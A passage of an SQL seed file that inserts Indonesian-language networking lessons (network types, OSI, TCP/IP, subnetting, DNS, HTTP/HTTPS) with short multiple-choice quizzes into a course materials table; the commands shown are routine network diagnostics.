![Gambaran umum arsitektur jaringan komputer](https://sfile.chatglm.cn/images-ppt/69006b36966a.jpg)

## Klasifikasi Jaringan Berdasarkan Skala

Jaringan dikelompokkan berdasarkan cakupan geografisnya. Pemahaman skala ini menentukan pilihan teknologi dan topologi yang sesuai:

```text
PAN   (Personal Area Network)      → Bluetooth, perangkat personal (≤ 10m)
LAN   (Local Area Network)         → Rumah, kantor, sekolah (≤ 1 km)
MAN   (Metropolitan Area Network)  → Antar gedung dalam kota (≤ 50 km)
WAN   (Wide Area Network)          → Antar kota/negara, contoh: internet
GAN   (Global Area Network)        → Jaringan global lintas benua
```

LAN umumnya menggunakan Ethernet dengan kecepatan 1 Gbps hingga 10 Gbps, sementara WAN bergantung pada teknologi ISP seperti fiber optic, MPLS, atau satelit. Wi-Fi adalah contoh LAN wireless yang sangat populer di rumah dan kantor karena fleksibilitasnya.

## Topologi Jaringan

Topologi menentukan cara perangkat dihubungkan secara fisik atau logis. Setiap topologi punya kelebihan dan kekurangan masing-masing:

- **Star** — semua perangkat terhubung ke switch pusat. Paling umum dipakai karena mudah dikelola dan jika satu node gagal, yang lain tetap jalan. Tapi jika switch pusat mati, seluruh jaringan down.
- **Bus** — satu kabel backbone. Mudah dipasang dan murah, tapi rentan gagal total bila kabel putus dan performa menurun saat node bertambah.
- **Ring** — perangkat membentuk lingkaran, data mengalir satu arah. Dulu dipakai Token Ring IBM, kini jarang digunakan.
- **Mesh** — setiap node terhubung ke banyak node lain. Sangat tangguh dan dipakai di jaringan kritis (militer, backbone internet), namun biaya tinggi.
- **Tree** — kombinasi beberapa star dengan struktur hierarki. Cocok untuk jaringan organisasi besar.

## Komponen Utama Jaringan

```bash
# Cek interface jaringan di Linux
ip addr show
ip link show

# Lihat gateway default
ip route | grep default

# Cek koneksi ke host
ping -c 4 8.8.8.8
```

Komponen penting yang harus dikenali:

1. **NIC** (Network Interface Card) — kartu jaringan pada perangkat, bisa ethernet atau Wi-Fi
2. **Switch** — menghubungkan perangkat dalam satu LAN berdasarkan MAC address (layer 2)
3. **Router** — menghubungkan jaringan berbeda dan meneruskan paket berdasarkan IP (layer 3)
4. **Access Point** — menyediakan koneksi Wi-Fi untuk perangkat wireless
5. **Modem** — menerjemahkan sinyal ISP (analog/koaksial/fiber) menjadi data digital
6. **Firewall** — menyaring traffic berdasarkan aturan keamanan
7. **Load Balancer** — mendistribusikan traffic ke beberapa server

## Media Transmisi

Jaringan menggunakan berbagai media untuk mengirim data:

- **Kabel UTP** — tembaga, murah, umum di LAN (Cat5e, Cat6, Cat6a)
- **Fiber Optic** — cahaya laser, jarak jauh & bandwidth besar, anti interferensi
- **Wireless** — gelombang radio (Wi-Fi, Bluetooth, 4G/5G), fleksibel tapi rentan interferensi
- **Coaxial** — dulu untuk TV kabel & cable internet, kini semakin jarang

## Karakteristik Jaringan yang Baik

Jaringan ideal harus memenuhi empat kriteria utama:

- **Cepat (Performance)** — throughput tinggi, latency rendah
- **Andal (Reliability)** — uptime tinggi (>99.9%), redundant link
- **Aman (Security)** — enkripsi, firewall, segmentasi
- **Skalabel (Scalability)** — mudah diperluas tanpa redesign besar

## Tips & Best Practices

1. Dokumentasikan setiap perangkat, IP, dan kabel dalam spreadsheet atau tools seperti NetBox.
2. Gunakan kabel yang sesuai standar (T568B) dan label setiap ujung kabel.
3. Pisahkan VLAN untuk guest, IoT, dan internal demi keamanan.
4. Monitor traffic dengan tools seperti Zabbix, PRTG, atau Prometheus + Grafana.
5. Backup konfigurasi router/switch secara berkala ke server terpisah.

## Kesimpulan

Jaringan komputer adalah tulang punggung dunia digital modern. Dengan memahami jenis jaringan (PAN/LAN/MAN/WAN), topologi (star/bus/ring/mesh), komponen (switch/router/AP), dan media transmisi, Anda memiliki fondasi yang kuat untuk belajar lebih dalam. Bangunlah lab kecil di rumah dengan satu router dan beberapa perangkat untuk merasakan alur paket secara nyata sebelum melangkah ke konfigurasi profesional.



## Studi Kasus: Troubleshooting

Ping server, traceroute, check DNS, check port, Wireshark.

## Tips

> Setup lab sendiri dengan virtual machines.', '🌐', false, '[{"question":"Jaringan yang mencakup area rumah atau kantor kecil disebut?","options":["WAN","MAN","LAN","PAN"],"answer":2,"explanation":"LAN (Local Area Network) mencakup area terbatas seperti rumah, kantor, atau sekolah, biasanya dalam radius ≤ 1 km."},{"question":"Topologi yang menggunakan switch pusat sebagai penghubung semua perangkat adalah?","options":["Bus","Ring","Mesh","Star"],"answer":3,"explanation":"Topologi Star menghubungkan semua perangkat ke satu titik pusat (switch/hub). Ini topologi paling umum di LAN modern."},{"question":"Fungsi utama router dalam jaringan adalah?","options":["Menyediakan koneksi Wi-Fi","Menghubungkan dua atau lebih jaringan berbeda","Menyimpan data sementara","Menerjemahkan sinyal analog"],"answer":1,"explanation":"Router bekerja di layer 3 (Network) dan berfungsi menghubungkan jaringan berbeda serta meneruskan paket berdasarkan IP tujuan."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('osi-model', 4, 2, 'OSI Model', 'osi-model', '7 layer OSI model dan fungsinya masing-masing.', '# OSI Model


![OSI Model](https://sfile.chatglm.cn/images-ppt/8bc9e410d70d.png)

**OSI Model** (Open Systems Interconnection) adalah kerangka konseptual 7 layer yang dikembangkan oleh ISO pada 1984 untuk menjelaskan bagaimana data berpindah dari aplikasi di satu komputer ke aplikasi di komputer lain melalui jaringan. Model ini menjadi standar referensi akademik dan industri untuk memahami komunikasi data, walau dalam praktiknya internet lebih banyak menggunakan model TCP/IP yang lebih sederhana. OSI tetap relevan karena memberikan pemisahan tanggung jawab yang jelas antar layer, memudahkan troubleshooting dan desain protokol baru.

![Ilustrasi 7 layer OSI Model](https://sfile.chatglm.cn/images-ppt/69006b36966a.jpg)

## Tujuh Layer OSI

```text
Layer 7  | Application  | HTTP, FTP, SMTP, DNS, SSH
Layer 6  | Presentation | Enkripsi, kompresi, encoding (TLS, JPEG, ASCII)
Layer 5  | Session      | Manajemen sesi (NetBIOS, RPC, PPTP)
Layer 4  | Transport    | TCP, UDP (port & segment)
Layer 3  | Network      | IP, ICMP, routing antar jaringan
Layer 2  | Data Link    | Ethernet, MAC address, switch
Layer 1  | Physical     | Kabel, sinyal listrik/cahaya/gelombang
```

Setiap layer memiliki tugas spesifik dan hanya berkomunikasi dengan layer di atas dan bawahnya. Pendekatan ini disebut **encapsulation** — saat data turun dari layer 7 ke 1, setiap layer menambahkan header sendiri.

## Cara Mengingat Urutan

Mnemonic populer dari atas ke bawah: **A**ll **P**eople **S**eem **T**o **N**eed **D**ata **P**rocessing. Dari bawah ke atas: **P**lease **D**o **N**ot **T**hrow **S**ausage **P**izza **A**way. Trik ini sangat membantu saat ujian sertifikasi seperti CCNA atau CompTIA Network+.

## Alur Data (Encapsulation)

Saat data dikirim dari aplikasi, tiap layer menambahkan header sendiri:

```bash
# Layer 4 menambahkan port (TCP/UDP)
# Layer 3 menambahkan IP sumber & tujuan
# Layer 2 menambahkan MAC address + frame check
# Layer 1 mengirim sebagai bit/sinyal fisik

# Simulasi capture paket melihat header tiap layer
sudo tcpdump -i eth0 -nn -vv
```

Di sisi penerima, proses berkebalikan (**decapsulation**) — tiap layer melepas header dan meneruskan payload ke layer atasnya sampai mencapai aplikasi tujuan.

## Penjelasan Setiap Layer

- **Layer 1 (Physical)** — mengirim bit mentah melalui media fisik (kabel, fiber, radio). Standar: RS-232, Ethernet PHY, 802.11 PHY.
- **Layer 2 (Data Link)** — framing data, MAC addressing, deteksi error. Standar: Ethernet, PPP, ARP (kadang dianggap 2.5).
- **Layer 3 (Network)** — logical addressing (IP), routing antar jaringan. Protokol: IPv4, IPv6, ICMP.
- **Layer 4 (Transport)** — segmentasi data, port number, reliability. Protokol: TCP (connection-oriented), UDP (connectionless).
- **Layer 5 (Session)** — membuka, kelola, dan tutup sesi antar aplikasi. Protokol: NetBIOS, RPC.
- **Layer 6 (Presentation)** — translasi, enkripsi, kompresi data. Standar: TLS/SSL, JPEG, MPEG.
- **Layer 7 (Application)** — antarmuka ke user/app. Protokol: HTTP, FTP, SMTP, DNS.

## Layer yang Paling Sering Diuji

- **Layer 3 (Network):** IP addressing, routing, subnetting
- **Layer 4 (Transport):** TCP vs UDP, port number, three-way handshake
- **Layer 7 (Application):** protokol yang dipakai user secara langsung

```text
Port penting yang harus dihafal:
HTTP=80 | HTTPS=443 | SSH=22 | FTP=21 | SMTP=25 | DNS=53 | DHCP=67/68
```

## Tips & Best Practices

1. Saat troubleshooting, gunakan pendekatan **bottom-up** — cek layer 1 dulu (kabel, power) sebelum naik ke layer 7.
2. Pahami perbedaan TCP dan UDP karena menentukan pilihan protokol aplikasi.
3. Pelajari nomor port umum: HTTP 80, HTTPS 443, SSH 22, DNS 53, SMTP 25.
4. Gunakan Wireshark untuk melihat header tiap layer secara visual.
5. Hafalkan mnemonic untuk memudahkan mengingat urutan saat ujian sertifikasi.

## Kesimpulan

OSI Model adalah peta mental penting bagi siapa pun yang bekerja dengan jaringan. Walau model TCP/IP lebih dekat dengan implementasi nyata, OSI memberikan kerangka berpikir yang lebih granular dan terstruktur. Dengan menguasai 7 layer, fungsi masing-masing, dan proses encapsulation/decapsulation, Anda dapat melakukan troubleshooting yang lebih sistematis dan memahami protokol baru dengan lebih cepat.



## Studi Kasus: Troubleshooting

Ping server, traceroute, check DNS, check port, Wireshark.

## Tips

> Setup lab sendiri dengan virtual machines.', '📚', false, '[{"question":"Pada layer OSI manakah protokol HTTP beroperasi?","options":["Layer 4 (Transport)","Layer 5 (Session)","Layer 6 (Presentation)","Layer 7 (Application)"],"answer":3,"explanation":"HTTP, FTP, SMTP, dan DNS adalah protokol layer 7 (Application) karena berinteraksi langsung dengan aplikasi pengguna."},{"question":"Layer OSI yang bertanggung jawab atas routing dan IP addressing adalah?","options":["Layer 2","Layer 3","Layer 4","Layer 7"],"answer":1,"explanation":"Layer 3 (Network) menangani logical addressing (IP) dan routing paket antar jaringan. IP dan ICMP bekerja di layer ini."},{"question":"Apa perbedaan utama antara TCP dan UDP yang berada di layer 4?","options":["TCP untuk Wi-Fi, UDP untuk kabel","TCP connection-oriented & andal, UDP connectionless & cepat","TCP hanya untuk LAN, UDP untuk WAN","TCP menggunakan IP, UDP tidak"],"answer":1,"explanation":"TCP menjamin pengiriman dengan handshake dan retransmisi (andal), sedangkan UDP mengirim tanpa koneksi (cepat tapi tidak dijamin sampai)."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('tcp-ip-protocol', 4, 3, 'TCP/IP Protocol', 'tcp-ip-protocol', 'Protocol suite TCP/IP: 4 layer, handshake, dan packet.', '# TCP/IP Protocol


![TCP/IP Protocol](https://sfile.chatglm.cn/images-ppt/8bc9e410d70d.png)

**TCP/IP** adalah suite protokol dasar yang menjalankan internet. Berbeda dengan OSI 7 layer, TCP/IP menggunakan model 4 layer yang lebih sederhana dan menjadi standar de facto di dunia nyata. Dikembangkan oleh Vint Cerf dan Bob Kahn pada 1970-an untuk ARPANET, TCP/IP terbukti tangguh dan skalabel hingga menghubungkan miliaran perangkat hari ini. Hampir semua aplikasi internet — web, email, streaming, game — berjalan di atas TCP/IP.

![Arsitektur model TCP/IP 4 layer](https://sfile.chatglm.cn/images-ppt/69006b36966a.jpg)

## 4 Layer TCP/IP

```text
Application  → HTTP, HTTPS, DNS, SSH, FTP, SMTP
Transport    → TCP (andal), UDP (cepat)
Internet     → IP, ICMP, ARP
Link/Access  → Ethernet, Wi-Fi, MAC address
```

Pemetaan ke OSI: Application (TCP/IP) mencakup layer 7+6+5 (OSI), Transport = layer 4, Internet = layer 3, Link = layer 2+1. Pendekatan TCP/IP lebih praktis karena menggabungkan layer yang jarang diimplementasikan terpisah di dunia nyata.

## TCP Three-Way Handshake

Sebelum mengirim data, TCP membuat koneksi dengan handshake tiga langkah:

```bash
# 1. Client → Server : SYN (synchronize)
# 2. Server → Client : SYN-ACK (acknowledge)
# 3. Client → Server : ACK (connection established)

# Lihat handshake secara langsung
sudo tcpdump -i any -n ''tcp port 80'' -S
```

Setelah handshake selesai, data dapat dikirim secara dua arah dengan nomor urut (sequence number) untuk memastikan tidak ada paket hilang. Saat koneksi ditutup, ada **four-way handshake** FIN/ACK untuk memastikan semua data tersampaikan.

## TCP vs UDP

| Aspek        | TCP                  | UDP                  |
|--------------|----------------------|----------------------|
| Koneksi      | Connection-oriented  | Connectionless       |
| Reliability  | Tinggi (retransmit)  | Rendah (best effort) |
| Kecepatan    | Lebih lambat         | Lebih cepat          |
| Header size  | 20 byte              | 8 byte               |
| Use case     | Web, email, file     | Streaming, game, DNS |

Pilih **TCP** bila butuh keandalan (transfer file, email, banking). Pilih **UDP** bila butuh kecepatan dan toleran terhadap sedikit packet loss (video call, game real-time, DNS query).

## Struktur Paket IP

```text
[IP Header (20 byte)] [TCP/UDP Header] [Payload Data]
   - Source IP
   - Destination IP
   - TTL (Time To Live)
   - Protocol field (6=TCP, 17=UDP)
```

Field TTL (Time To Live) berkurang 1 setiap kali paket melewati router. Jika mencapai 0, paket dibuang. Mekanisme ini mencegah paket loop selamanya di jaringan. Default TTL: 64 (Linux/macOS), 128 (Windows).

## State Mesin TCP

```bash
# Lihat state koneksi TCP
ss -tunap
netstat -tunap

# State umum:
# LISTEN, SYN_SENT, SYN_RECV, ESTABLISHED,
# FIN_WAIT_1, FIN_WAIT_2, TIME_WAIT, CLOSE_WAIT, CLOSED
```

State **TIME_WAIT** sering muncul setelah koneksi ditutup dan berlangsung 2*MSL (~60-120 detik). Server sibuk bisa kehabisan port jika banyak koneksi pendek — solusinya: connection pooling atau tuning parameter kernel.

## Aplikasi Protokol di Layer Application

- **HTTP/HTTPS** — web browsing, REST API, GraphQL
- **DNS** — resolusi nama domain ke IP
- **SSH** — remote shell aman, port forwarding, tunneling
- **SMTP/IMAP/POP3** — kirim dan terima email
- **FTP/SFTP** — transfer file (FTP lama, SFTP modern & aman)
- **DHCP** — pemberian IP otomatis ke client
- **NTP** — sinkronisasi waktu antar perangkat
- **SNMP** — monitoring perangkat jaringan

Setiap protokol punya karakteristik sendiri. Misalnya DNS umumnya pakai UDP port 53 untuk query singkat, tapi TCP saat response besar (zone transfer). SSH menggunakan TCP port 22 dengan enkripsi end-to-end. Pemilihan protokol yang tepat menentukan efisiensi dan keamanan aplikasi.

## Serangan Umum pada TCP/IP

- **SYN Flood** — banjir SYN tanpa ACK, habiskan resource server. Mitigasi: SYN cookies.
- **TCP Reset Attack** — kirim paket RST palsu untuk putuskan koneksi.
- **Session Hijacking** — curi session token yang tidak dienkripsi.
- **IP Spoofing** — palsukan IP sumber, sulit di-trace.

Pemahaman serangan ini penting untuk membangun sistem yang tangguh dan melakukan forensik jaringan ketika insiden terjadi.

## Tips & Best Practices

1. Gunakan `netstat -tulpn` atau `ss -tlnp` di Linux untuk melihat koneksi aktif dan port terbuka.
2. Pahami state mesin TCP untuk debugging — banyak bug production terkait TIME_WAIT dan CLOSE_WAIT.
3. Untuk aplikasi real-time, pertimbangkan UDP atau QUIC (HTTP/3) untuk performa lebih baik.
4. Aktifkan **TCP keepalive** untuk mendeteksi koneksi mati pada aplikasi long-lived.
5. Gunakan `tcpdump` atau Wireshark untuk analisis paket nyata saat debugging.

## Kesimpulan

TCP/IP adalah fondasi yang menjalankan internet. Memahami 4 layer, three-way handshake, perbedaan TCP vs UDP, struktur paket IP, dan state mesin TCP memberi Anda kemampuan untuk membangun aplikasi yang andal dan melakukan debugging jaringan secara efektif. Konsep ini juga kunci untuk memahami serangan seperti SYN flood dan cara mitigasinya.



## Studi Kasus: Troubleshooting

Ping server, traceroute, check DNS, check port, Wireshark.

## Tips

> Setup lab sendiri dengan virtual machines.', '🔌', false, '[{"question":"Urutan benar TCP three-way handshake adalah?","options":["ACK → SYN → SYN-ACK","SYN → SYN-ACK → ACK","SYN → ACK → SYN-ACK","SYN-ACK → SYN → ACK"],"answer":1,"explanation":"Client mengirim SYN, server membalas dengan SYN-ACK, lalu client mengirim ACK. Setelah itu koneksi ESTABLISHED."},{"question":"Protokol berikut menggunakan UDP, KECUALI?","options":["DNS query","Video streaming","File transfer FTP","Online game real-time"],"answer":2,"explanation":"FTP menggunakan TCP karena butuh keandalan transfer file. DNS query, streaming, dan game real-time umumnya pakai UDP."},{"question":"Pada layer mana IP (Internet Protocol) beroperasi dalam model TCP/IP?","options":["Application","Transport","Internet","Link"],"answer":2,"explanation":"IP beroperasi di layer Internet pada model TCP/IP, setara dengan layer 3 (Network) pada OSI, bertugas routing antar jaringan."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('ip-addressing-subnetting', 4, 4, 'IP Addressing & Subnetting', 'ip-addressing-subnetting', 'IPv4, IPv6, subnet mask, CIDR, dan perhitungan subnet.', '# IP Addressing & Subnetting


![IP Addressing & Subnetting](https://sfile.chatglm.cn/images-ppt/c5a37b7c3a5a.jpg)

**IP Address** adalah alamat unik untuk setiap perangkat di jaringan, sama seperti nomor rumah di dunia nyata. Ada dua versi: **IPv4** (32-bit, ditulis desimal) dan **IPv6** (128-bit, ditulis heksadesimal). IPv4 masih dominan di LAN, sementara IPv6 semakin dipakai di internet publik karena IPv4 sudah kehabisan alamat. Memahami IP addressing dan subnetting adalah skill wajib bagi network engineer, sysadmin, dan cloud architect.

![Konsep IP addressing dan subnetting](https://sfile.chatglm.cn/images-ppt/69006b36966a.jpg)

## IPv4 Classes

```text
Class A: 1.0.0.0     - 126.255.255.255   (subnet: 255.0.0.0     /8)
Class B: 128.0.0.0   - 191.255.255.255   (subnet: 255.255.0.0   /16)
Class C: 192.0.0.0   - 223.255.255.255   (subnet: 255.255.255.0 /24)
Class D: 224.0.0.0   - 239.255.255.255   (multicast)
Class E: 240.0.0.0   - 255.255.255.255   (eksperimen)
```

Private range (RFC 1918): `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`. IP ini tidak dialokasikan ke internet publik dan bebas dipakai di LAN. Loopback: `127.0.0.0/8` (umumnya 127.0.0.1 = localhost).

## Subnet Mask & CIDR

Subnet mask menentukan bagian network dan host dari IP. CIDR (Classless Inter-Domain Routing) menuliskan prefix dalam format `/n`:

```bash
# CIDR notation
192.168.1.0/24  = 255.255.255.0    (256 alamat, 254 host)
192.168.1.0/25  = 255.255.255.128  (128 alamat, 126 host)
192.168.1.0/30  = 255.255.255.252  (4 alamat, 2 host)

# Hitung subnet otomatis
ipcalc 192.168.1.0/26
# Output: Network 192.168.1.0, HostMin .1, HostMax .62, Broadcast .63
```

CIDR memungkinkan alokasi IP lebih fleksibel dibanding class tradisional. Saat ini hampir semua routing modern menggunakan CIDR.

## Perhitungan Subnet

Rumus jumlah host per subnet: `2^(32-prefix) - 2` (kurangi network & broadcast). Rumus jumlah subnet: `2^(prefix - default_prefix)`.

Contoh: `192.168.1.0/26` dari Class C default /24:
- Bit dipinjam: 26 - 24 = 2 → 4 subnet
- Host per subnet: 2^(32-26) - 2 = 64 - 2 = 62 host
- Range: .0-.63, .64-.127, .128-.191, .192-.255

## Tabel Prefix Populer

```text
Prefix | Subnet Mask        | Host | Use case
/24    | 255.255.255.0      | 254  | LAN kantor kecil
/25    | 255.255.255.128    | 126  | Subnet medium
/26    | 255.255.255.192    | 62   | Subnet kecil
/27    | 255.255.255.224    | 30   | VLAN kecil
/28    | 255.255.255.240    | 14   | DMZ / lab
/30    | 255.255.255.252    | 2    | Link point-to-point router
/32    | 255.255.255.255    | 1    | Host tunggal (loopback)
```

## IPv6 Singkat

```text
2001:0db8:85a3:0000:0000:8a2e:0370:7334
→ disingkat: 2001:db8:85a3::8a2e:370:7334
```

IPv6 menghapus broadcast (diganti multicast), menggunakan `fe80::/10` untuk link-local, dan mendukung auto-konfigurasi (SLAAC). Setiap interface bisa punya multiple IPv6 address secara bersamaan.

## VLSM (Variable Length Subnet Masking)

VLSM memungkinkan subnet dengan prefix berbeda dalam satu jaringan — menghemat IP. Contoh: department besar pakai /24, department kecil pakai /28. Tanpa VLSM, semua subnet harus pakai ukuran sama (mubazir).

Contoh penerapan VLSM: Anda diberi blok 192.168.10.0/24 dan harus membagi untuk 4 department:
- Engineering (60 host) → 192.168.10.0/26 (62 host)
- Sales (30 host) → 192.168.10.64/27 (30 host)
- Marketing (14 host) → 192.168.10.96/28 (14 host)
- IT Admin (6 host) → 192.168.10.112/29 (6 host)

Tanpa VLSM, semua department akan dapat /26 (62 host) — boros untuk yang kecil. Dengan VLSM, alokasi pas kebutuhan dan sisanya bisa untuk future use.

## Public vs Private IP & NAT

```text
Public IP  → Unik di internet, dialokasikan IANA/RIR
Private IP → Hanya untuk LAN, tidak routing di internet
             10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
NAT        → Network Address Translation, translasi private↔public
             Memungkinkan banyak device share 1 public IP
```

NAT (Network Address Translation) di router rumah mengubah private IP (192.168.1.x) menjadi public IP ISP saat paket keluar. Inilah yang memungkinkan semua perangkat di rumah share satu koneksi internet. NAT juga memberi lapisan keamanan dasar karena koneksi inbound tidak otomatis diteruskan.

## Tips & Best Practices

1. Gunakan `ipcalc` atau `sipcalc` di Linux untuk menghitung subnet dengan cepat tanpa salah hitung manual.
2. Hafalkan tabel prefix /24 sampai /30 karena paling sering dipakai di ujian dan konfigurasi router.
3. Dokumentasikan IP allocation di NetBox atau spreadsheet untuk hindari konflik.
4. Pisahkan subnet berdasarkan fungsi: server, guest Wi-Fi, IoT, management.
5. Pertimbangkan IPv6 dual-stack untuk jaringan baru — masa depan internet.

## Kesimpulan

IP addressing dan subnetting adalah skill fundamental yang memungkinkan Anda merancang jaringan yang efisien, menghindari konflik IP, dan mengoptimalkan alokasi. Dengan menguasai IPv4 classes, CIDR, perhitungan subnet, VLSM, dan dasar IPv6, Anda siap menghadapi konfigurasi jaringan nyata maupun ujian sertifikasi seperti CCNA.



## Studi Kasus: Troubleshooting

Ping server, traceroute, check DNS, check port, Wireshark.

## Tips

> Setup lab sendiri dengan virtual machines.', '🔢', false, '[{"question":"Berapa jumlah host yang tersedia di /24 network?","options":["128","254","256","512"],"answer":1,"explanation":"/24 memiliki 2^8 = 256 alamat, dikurangi network dan broadcast = 254 host tersedia."},{"question":"Subnet mask untuk /24 adalah?","options":["255.0.0.0","255.255.0.0","255.255.255.0","255.255.255.255"],"answer":2,"explanation":"/24 berarti 24 bit pertama untuk network, sisanya 8 bit untuk host. Subnet mask-nya 255.255.255.0."},{"question":"IP 192.168.1.100 termasuk kelas berapa?","options":["Class A","Class B","Class C","Class D"],"answer":2,"explanation":"Range 192.0.0.0 - 223.255.255.255 adalah Class C. IP 192.168.1.100 juga termasuk private range RFC 1918."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('dns-domain', 4, 5, 'DNS & Domain', 'dns-domain', 'Cara kerja DNS, record types, dan registrasi domain.', '# DNS & Domain


![DNS & Domain](https://sfile.chatglm.cn/images-ppt/bf3612922e44.png)

**DNS (Domain Name System)** adalah sistem yang menerjemahkan nama domain yang mudah diingat (mis. `google.com`) menjadi IP address numerik (`142.250.190.46`). Tanpa DNS, kita harus menghafal IP setiap website — sesuatu yang mustahil dengan miliaran host di internet. Sering disebut "phonebook internet", DNS adalah salah satu protokol paling penting dan paling sering diabaikan dalam debugging. Memahami DNS sangat berguna saat setup website, email server, atau troubleshoot koneksi.

![Hierarki dan cara kerja DNS](https://sfile.chatglm.cn/images-ppt/69006b36966a.jpg)

## Hierarki DNS

```text
Root DNS Server (.)
  └─ TLD (.com, .org, .id, .net)
       └─ Authoritative nameserver (example.com)
            └─ Record A / AAAA / CNAME / MX
```

Root server dikelola 12 organisasi berbeda dengan total 13 logical instances (A-M). Ada ribuan instance fisik menggunakan anycast. TLD dibagi menjadi gTLD (.com, .org, .net) dan ccTLD (.id, .uk, .jp).

## Cara Kerja Resolusi DNS

```bash
# Query DNS manual
dig google.com
dig +short example.com
dig MX gmail.com

# Cek cache DNS lokal
nslookup example.com 8.8.8.8

# Flush DNS cache (systemd-resolved)
sudo resolvectl flush-caches
```

Alur resolusi: browser → cache lokal OS → resolver ISP → root server → TLD server → authoritative server → jawaban IP. Setiap langkah di-cache untuk mempercepat query berikutnya (TTL-based).

## Jenis Record DNS

```text
A       → Domain ke IPv4
AAAA    → Domain ke IPv6
CNAME   → Alias ke domain lain
MX      → Mail server (dengan prioritas)
TXT     → Verifikasi & SPF/DKIM
NS      → Nameserver otoritatif
SOA     → Start of Authority (metadata zone)
SRV     → Service record (VoIP, Active Directory)
PTR     → Reverse DNS (IP → nama)
CAA     → Otoritas penerbit sertifikat
```

## Contoh Konfigurasi Zone

```text
; Zone file example.com
@       IN  A      203.0.113.10
www     IN  CNAME  example.com.
mail    IN  A      203.0.113.20
@       IN  MX 10  mail.example.com.
@       IN  TXT    "v=spf1 include:_spf.google.com ~all"
_dmarc  IN  TXT    "v=DMARC1; p=reject;"
```

Record TXT untuk SPF dan DKIM sangat penting agar email dari domain Anda tidak ditandai sebagai spam oleh Gmail/Outlook. DMARC menentukan kebijakan jika SPF/DKIM gagal.

## Registrasi Domain

Domain dibeli dari **registrar** (Namecheap, Cloudflare, GoDaddy, Idwebhost, Rumahweb). Saat membeli, Anda menyewa nama untuk periode tertentu (1-10 tahun). Setelah punya domain:

1. Set **NS records** ke hosting/DNS provider
2. Tambahkan **A record** untuk subdomain utama
3. Konfigurasi **MX** untuk email
4. Set **TXT SPF/DKIM/DMARC** untuk keamanan email

DNS propagation (waktu perubahan tersebar ke seluruh dunia) biasanya 1-48 jam tergantung TTL. Untuk perubahan mendesak, turunkan TTL 24 jam sebelumnya.

## DNS Resolver Publik

```text
Google DNS    : 8.8.8.8, 8.8.4.4
Cloudflare   : 1.1.1.1, 1.0.0.1 (privacy-first, cepat)
OpenDNS      : 208.67.222.222
Quad9        : 9.9.9.9 (security-focused)
```

Cloudflare (1.1.1.1) sering jadi pilihan terbaik untuk performa dan privasi karena tidak log query.

## Tips & Best Practices

1. Gunakan `dig` bukan `ping` untuk debugging DNS karena lebih detail menampilkan TTL dan record type.
2. Set TTL rendah (300s) saat akan migrasi, tinggikan (3600s) setelah stabil.
3. Selalu konfigurasi SPF, DKIM, DMARC untuk domain yang mengirim email.
4. Gunakan DNSSEC untuk validasi otoritatif (mencegah spoofing).
5. Monitor DNS dengan tools seperti `dnsmeter` atau Pingdom untuk pastikan tersedia.

## Kesimpulan

DNS adalah protokol esensial yang membuat internet ramah manusia. Dengan memahami hierarki DNS, jenis record (A, AAAA, CNAME, MX, TXT), alur resolusi, dan cara registrasi domain, Anda dapat mengelola website dan email secara profesional. Setup domain sendiri di Cloudflare (gratis) adalah cara terbaik untuk mempraktikkan teori ini secara langsung.



## Studi Kasus: Troubleshooting

Ping server, traceroute, check DNS, check port, Wireshark.

## Tips

> Setup lab sendiri dengan virtual machines.', '🔗', false, '[{"question":"Record DNS yang memetakan domain ke IPv4 adalah?","options":["AAAA","CNAME","A","MX"],"answer":2,"explanation":"Record A memetakan hostname ke IPv4 32-bit. Record AAAA digunakan untuk IPv6 128-bit."},{"question":"Record DNS yang menentukan mail server sebuah domain adalah?","options":["A","MX","TXT","NS"],"answer":1,"explanation":"MX (Mail Exchange) record menentukan server yang menerima email untuk domain tersebut, lengkap dengan prioritas."},{"question":"Hierarki DNS yang BENAR dari tertinggi ke terendah adalah?","options":["TLD → Root → Authoritative","Root → Authoritative → TLD","Root → TLD → Authoritative","Authoritative → TLD → Root"],"answer":2,"explanation":"Resolusi dimulai dari Root (.), turun ke TLD (.com), lalu ke Authoritative nameserver domain yang bersangkutan."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('http-https-protocol', 4, 6, 'HTTP/HTTPS Protocol', 'http-https-protocol', 'HTTP methods, status code, header, dan HTTPS/TLS.', '# HTTP/HTTPS Protocol


![HTTP/HTTPS Protocol](https://sfile.chatglm.cn/images-ppt/8d2503202540.jpg)

**HTTP (HyperText Transfer Protocol)** adalah protokol layer aplikasi untuk mentransfer dokumen web. Diciptakan Tim Berners-Lee di CERN (1989), HTTP berevolusi dari versi 0.9 (text only) ke HTTP/1.1 (1997, persistent connection), HTTP/2 (2015, multiplexing), dan HTTP/3 (2022, QUIC over UDP). **HTTPS** adalah HTTP yang dibungkus enkripsi TLS/SSL — saat ini wajib untuk semua website modern karena browser seperti Chrome menandai HTTP sebagai "Not Secure".

![Cara kerja HTTP dan HTTPS](https://sfile.chatglm.cn/images-ppt/69006b36966a.jpg)

## HTTP Methods

```text
GET     → Mengambil data (safe, idempotent)
POST    → Mengirim data baru (create)
PUT     → Update seluruh resource (idempotent)
PATCH   → Update sebagian resource
DELETE  → Hapus resource
HEAD    → Hanya header, tanpa body
OPTIONS → Cek method yang didukung (CORS preflight)
```

**Safe** = tidak mengubah state server. **Idempotent** = request berulang memberi hasil sama. GET/HEAD/OPTIONS safe; GET/PUT/DELETE idempotent; POST tidak keduanya.

## Status Code

```bash
# Curl untuk lihat response header
curl -I https://example.com

# Verifikasi TLS certificate
openssl s_client -connect example.com:443 -servername example.com
```

Kategori status code:

```text
1xx Informational  (100 Continue, 101 Switching Protocol)
2xx Success        (200 OK, 201 Created, 204 No Content)
3xx Redirection    (301 Moved, 302 Found, 304 Not Modified)
4xx Client Error   (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Too Many Requests)
